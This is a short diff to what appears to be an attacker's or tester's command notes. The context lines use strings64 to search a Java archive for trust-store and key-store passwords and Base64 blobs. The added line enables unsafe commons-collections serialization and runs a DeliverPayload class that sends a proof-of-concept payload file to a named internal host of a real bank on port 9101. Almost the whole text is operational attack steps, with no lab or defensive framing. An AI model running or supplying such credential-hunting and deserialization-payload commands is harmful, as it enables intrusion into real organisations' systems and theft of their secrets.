@@ -16,3 +16,6 @@ strings64.exe .\mxboot.jar | findstr /i "javax.net.ssl trustStorePassword keySto
 # Look for potential Base64 blobs (length >20, alphanumeric + / + =)
 strings64.exe .\mxboot.jar | findstr /r "^[A-Za-z0-9+/]\{20,\}==\{0,2\}$"
 
+java -Dorg.apache.commons.collections.enableUnsafeSerialization=true -cp .;jar\commons-collections-3.2.2.jar DeliverPayload d1a201130141319.obm.nix.srv.westpac.com.au 9101 http_poc.bin
+
+
